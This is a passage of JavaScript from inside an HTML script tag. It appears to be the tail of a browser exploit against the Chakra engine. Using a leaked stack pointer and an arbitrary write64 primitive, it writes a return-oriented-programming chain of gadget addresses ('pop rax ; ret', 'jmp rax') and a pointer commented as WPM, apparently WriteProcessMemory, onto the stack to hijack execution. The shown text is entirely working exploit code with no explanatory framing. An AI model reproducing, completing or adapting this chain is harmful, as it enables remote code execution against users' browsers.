    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
    ropCounter+=8
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], rt[0], rt[1]); // WPM 
    ropCounter+=8 
    write64(stackleakPointer[0]+final+ropCounter, stackleakPointer[1], chakraLo+0x00272beb, chakraHigh);    // 00272beb just jmp rax
    ropCounter+=8  

}
</script>